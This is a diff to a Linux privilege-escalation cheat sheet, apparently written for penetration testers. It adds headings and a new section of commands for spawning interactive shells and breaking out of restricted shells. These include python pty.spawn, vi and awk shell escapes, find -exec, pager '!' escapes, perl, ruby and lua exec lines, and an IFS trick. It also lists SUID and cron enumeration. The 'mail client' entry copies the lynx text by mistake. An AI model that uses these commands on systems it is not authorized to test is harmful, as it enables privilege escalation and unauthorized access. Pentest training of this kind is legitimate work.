@@ -8,14 +8,14 @@ lsb_release -a
 uname -a
 ````
  
-Find user information
+# Find user information
 ````
 id
 whoami
 last
 ````
  
-Check installed programs, permissions, and hidden files
+# Check installed programs, permissions, and hidden files
 ````
 ls -lah
 ls -lah /usr/bin
@@ -26,7 +26,7 @@ rpm -qa
 ls -lah /usr/share/applications | awk -F '.desktop' ' { print $1}'
 ````
  
-Manual escalation commands
+# Manual escalation commands
 ````
 sudo su
 sudo -i
@@ -40,7 +40,7 @@ find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null
 find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
 ````
 
-Evaluate running services
+# Evaluate running services
 ````
 ps aux
 ps aux -u root
@@ -52,7 +52,7 @@ service --status-all
 ````
 
  
-Check for scheduled tasks/jobs
+# Check for scheduled tasks/jobs
 ````
 cat /etc/cron.d/*
 cat /var/spool/cron/*
@@ -61,4 +61,85 @@ cat /etc/crontab
 cat /etc/cron.(time)
 systemctl list-timers
 ````
- 
+
+
+# Spawn and Upgrade shells to tty
+````
+python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/sh")'
+echo os.system('/bin/sh')
+echo os.system('/bin/bash')
+python -c "exit_code = os.system('/bin/sh') output = os.open('/bin/sh').read()"
+````
+
+# Escaping restricted shells
+https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells
+
+https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
+
+
+
+# Use binary with command execution
+## scp -S
+    scp -S /home/untrusted/script.sh x y:
+
+## vi/vim
+    ESC
+    :set shell=/bin/bash
+    :shell
+
+    :! /bin/bash
+
+## lynx & vi
+    open a local file with lynx (e.g.: $ lynx /etc/passwd)
+    type “o” to open the options; change the second option (Editor) to “/bin/vi” and save the changes to go back at the main page.
+    Type “e” to edit the file with vi
+    Follow instructions for vi
+
+## mail client
+    open a local file with lynx (e.g.: $ lynx /etc/passwd)
+    type “o” to open the options; change the second option (Editor) to “/bin/vi” and save the changes to go back at the main page.
+    Type “e” to edit the file with vi
+    Follow instructions for vi
+
+## elinks : web browser
+    $ set EDITOR=/bin/vi
+    Open a webpage containing a text box (should be easy to find on the Internet. If you can not, well lmgtfy!!!).
+    Navigate to the text-box area and Enter to edit, the press F4 (or whatever is used in the configurations) to edit the text box externally, and you should see something familiar :=)
+
+## Using IFS (à tester)
+    On lance un programme qui execute /bin/mail
+    On créé les fichier bin et mail en 777 dans le répertoire courant
+    export IFS="/"
+    
+## awk
+    awk 'BEGIN {system("/bin/sh")}'
+
+## find
+    find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+
+## More, Less, and Man Commands
+!commandxxx
+'! /bin/sh'
+'!/bin/sh'
+'!bash'
+
+## Filtered characters : use tee 
+
+If you do not have access to an editor, and would like to create a script, you can make use of the 'tee' command. 
+Since you cannot make use of '>' or '>>', the 'tee' command can help you direct your output when used in tandem with the 'echo' command. 
+
+echo "evil script code" | tee script.sh
+tee -a 'xx' : append to file
+
+## Langages
+    python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
+    perl -e 'exec "/bin/sh";'
+    perl: exec "/bin/sh";
+    ruby: exec "/bin/sh"
+    lua: os.execute('/bin/sh')
+    irb(main:001:0> exec "/bin/sh"
+
+## Files Executed in Unrestricted Mode?
+
+Some restricted shells will start by running some files in an unrestricted mode before the restricted shell is applied. If your .bash_profile is executed in an unrestricted mode and it's editable, you'll be able to execute code and commands as an unrestricted user.
